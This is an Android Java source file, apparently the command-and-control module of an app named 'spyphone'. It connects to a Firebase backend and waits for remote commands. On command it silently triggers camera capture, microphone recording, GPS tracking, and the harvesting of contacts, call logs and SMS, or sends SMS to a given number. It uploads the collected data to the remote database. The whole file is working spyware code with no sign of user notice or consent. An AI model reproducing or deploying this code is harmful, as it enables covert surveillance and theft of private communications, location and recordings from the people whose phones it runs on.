package emit.esy.es.spyphone.util;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.Messenger;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.firebase.client.AuthData;
import com.firebase.client.ChildEventListener;
import com.firebase.client.DataSnapshot;
import com.firebase.client.Firebase;
import com.firebase.client.FirebaseError;

import java.util.HashMap;
import java.util.Map;

import emit.esy.es.spyphone.R;
import emit.esy.es.spyphone.services.CallLogService;
import emit.esy.es.spyphone.services.CameraService;
import emit.esy.es.spyphone.services.ContactsService;
import emit.esy.es.spyphone.services.LocationService;
import emit.esy.es.spyphone.services.MicrophoneService;
import emit.esy.es.spyphone.services.SmsService;

/**
 * Created by Emil Makovac on 24/04/2015.
 */
public class FirebaseUtil {

    private static final String LOG_TAG = "FirebaseUtil";
    static String musername, mpassword;
    volatile String id;
    Firebase ref, userRef;
    static Context mcontext;

    public FirebaseUtil(Context context, String username, String password){
        mcontext = context;
        musername = username;
        mpassword = password;
    }

    private void createUser() {
        ref.createUser(musername, mpassword, new Firebase.ValueResultHandler<Map<String, Object>>() {

            @Override
            public void onSuccess(Map<String, Object> result) {
                Log.d(LOG_TAG, "User created. ID - " + result.get("uid").toString());
                id= result.get("uid").toString();
                //setOnline(id, false);
                //authenticate user
                authenticateUser();

            }

            @Override
            public void onError(FirebaseError firebaseError) {
                Log.d(LOG_TAG, "CreateUser ERROR");
            }
        });
    }

    public void authenticateUser() {
        ref = new Firebase(mcontext.getString(R.string.domain));
        ref.authWithPassword(musername, mpassword, new Firebase.AuthResultHandler() {

            @Override
            public void onAuthenticated(AuthData authData) {
                id = authData.getUid();
                Log.d(LOG_TAG, "User " + id + " authenticated");
                SharedPreferences sp = mcontext.getSharedPreferences(mcontext.getString(R.string.sharedPrefs), Context.MODE_PRIVATE);
                SharedPreferences.Editor editor = sp.edit();
                editor.putString("username", musername);
                editor.commit();
                setUpChildRef();
            }

            @Override
            public void onAuthenticationError(FirebaseError firebaseError) {
                //If error == no such user, create user
                switch (firebaseError.getCode()) {
                    case FirebaseError.USER_DOES_NOT_EXIST:
                        createUser();
                        break;
                }
            }
        });

    }

    Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {

            // do whatever with the bundle here
            uploadToFirebase(msg.getData());
        }
    };



    private void uploadToFirebase(Bundle data) {
        Log.d(LOG_TAG,"uploadToFirebase");
        // get the firebase androidWrite ref
        Firebase uploadRef = getUploadRef();
        // set value for action (bundle get action)
        String action = data.getString("action");
        Object content = new Object();
        Map<String, Object> aw = new HashMap<>();
        aw.put("action", action);
        //set value for content (switch case for content return value)
        switch(action){
            case "photo":
                content = data.getStringArrayList("content");
                mcontext.stopService(new Intent(mcontext, CameraService.class));
                break;
            case "mic":
                content = data.getString("content");
                mcontext.stopService(new Intent(mcontext, MicrophoneService.class));
                break;
            case "cords":
                content = data.getDoubleArray("content");
                boolean gpsEnabled = data.getBoolean("gpsEnabled");
                aw.put("gpsEnabled", gpsEnabled);
                break;
            case "contacts":
                content = data.getSerializable("content");
                break;
            case "callLog":
                content = data.getSerializable("content");
                break;
            case "sms":
                content = data.getSerializable("content");
                break;
            case "sendSms":
                content = data.getString("content");
                break;

        }
        aw.put("content", content);
        uploadRef.setValue(aw);
    }

    private Firebase getUploadRef() {
        return userRef.child("androidWrite");
    }

    ChildEventListener cel = new ChildEventListener() {
        @Override
        public void onChildAdded(DataSnapshot dataSnapshot, String s) {
            String child = dataSnapshot.getValue().toString();
            Log.d("ChildAdded", dataSnapshot.getKey() +" : "+ child);

        }

        @Override
        public void onChildChanged(DataSnapshot dataSnapshot, String s) {
            String child = dataSnapshot.getKey();

            Log.d("ChildChanged", child);

            Intent intent;
            //check if androidRead has changed
            if(child.equals("androidRead")){
                Log.d(LOG_TAG, dataSnapshot.getValue().toString());
                //check if androidRead has a string or a map of strings as a value
                try{
                    //if is a string
                    String childValue = (String)dataSnapshot.getValue();
                    switch (childValue){
                        case "photo":
                            Log.d(LOG_TAG, "Starting photo service");
                            intent = new Intent(mcontext, CameraService.class);
                            intent.putExtra("messenger", new Messenger(handler));
                            mcontext.startService(intent);
                            setOnDefaultAndroidRead(dataSnapshot);
                            break;
                        case "sms":
                            Log.d(LOG_TAG, "Starting sms service");
                            intent = new Intent(mcontext, SmsService.class);
                            intent.putExtra("action", childValue);
                            intent.putExtra("messenger", new Messenger(handler));
                            mcontext.startService(intent);
                            setOnDefaultAndroidRead(dataSnapshot);
                            break;
                        case "cords":
                            Log.d(LOG_TAG, "Starting geo service");
                            intent = new Intent(mcontext, LocationService.class);
                            intent.putExtra("messenger", new Messenger(handler));
                            mcontext.startService(intent);
                            setOnDefaultAndroidRead(dataSnapshot);
                            break;
                        case "contacts":
                            Log.d(LOG_TAG, "Starting contacts service");
                            intent = new Intent(mcontext, ContactsService.class);
                            intent.putExtra("messenger", new Messenger(handler));
                            mcontext.startService(intent);
                            setOnDefaultAndroidRead(dataSnapshot);
                            break;
                        case "callLog":
                            Log.d(LOG_TAG, "Starting call log service");
                            intent = new Intent(mcontext, CallLogService.class);
                            intent.putExtra("messenger", new Messenger(handler));
                            mcontext.startService(intent);
                            setOnDefaultAndroidRead(dataSnapshot);
                            break;
                        default:
                            Log.d(LOG_TAG, "Wrong action, nothing to start. Value is " + childValue);
                            break;
                    }
                } catch (Exception e){
                    //if is a map
                    Map<String, Object> childValue;
                    childValue = (Map<String, Object>) dataSnapshot.getValue();
                    String action = childValue.get("action").toString();

                    switch (action){
                        case "mic":
                            long duration = (long) childValue.get("secondParam");
                            Log.d(LOG_TAG, "Starting mic service with duration " + Long.toString(duration) + " sec");
                            //create intent to start microphone recording service with duration of recording
                            intent = new Intent(mcontext, MicrophoneService.class);
                            intent.putExtra("messenger", new Messenger(handler));
                            intent.putExtra("duration", duration);
                            mcontext.startService(intent);
                            setOnDefaultAndroidRead(dataSnapshot);
                            break;
                        case "sendSms":
                            String phoneNumber = (String) childValue.get("secondParam");
                            String smsBody = (String) childValue.get("thirdParam");
                            Log.d(LOG_TAG, "Starting sms service");
                            intent = new Intent(mcontext, SmsService.class);
                            intent.putExtra("messenger", new Messenger(handler));
                            intent.putExtra("action", action);
                            intent.putExtra("phoneNum", phoneNumber);
                            intent.putExtra("smsBody", smsBody);
                            mcontext.startService(intent);
                            setOnDefaultAndroidRead(dataSnapshot);
                            break;
                    }
                }

            }

        }

        @Override
        public void onChildRemoved(DataSnapshot dataSnapshot) {

        }

        @Override
        public void onChildMoved(DataSnapshot dataSnapshot, String s) {

        }

        @Override
        public void onCancelled(FirebaseError firebaseError) {

        }
    };

    public void setUpChildRef() {
        Log.d(LOG_TAG, "setUpChildRef");
        if(id != null){
            setOnline(id, true);
            userRef.addChildEventListener(cel);

        }
    }

    public void removeListener(){
        try {
            userRef.removeEventListener(cel);
            Log.d(LOG_TAG, "Listener removed");
        } catch (Exception e){
            Log.d(LOG_TAG, "No listener to remove");
        }
    }

    private void setOnDefaultAndroidRead(DataSnapshot dataSnapshot) {
        Log.d(LOG_TAG, "androidRead set to null");
        dataSnapshot.getRef().setValue("null");
    }

    private void setOnline(String id, boolean b) {
        userRef = ref.child(id);
        Map<String, Object> user = new HashMap<>();
        user.put("phoneNumber", getPhoneNumber());
        user.put("isOnline", b);
        user.put("androidRead", "null");
        Map<String, Object> connOnline = new HashMap<>();
        connOnline.put("isOnline", false);

        if(b){
            userRef.updateChildren(user);
            userRef.onDisconnect().updateChildren(connOnline);
        } else {
            removeListener();
            Log.d("setOnline", "false");
            //userRef.setValue(user);
            userRef.onDisconnect().updateChildren(connOnline);
        }
    }

    private String getPhoneNumber() {
        TelephonyManager tm = (TelephonyManager) mcontext.getSystemService(Context.TELEPHONY_SERVICE);
        String phNum = tm.getLine1Number();
        Log.d(LOG_TAG, "Line1Number - " + phNum);
        if(phNum != null){
            return phNum;
        } else {
            return "No phone number detected";
        }
    }


}
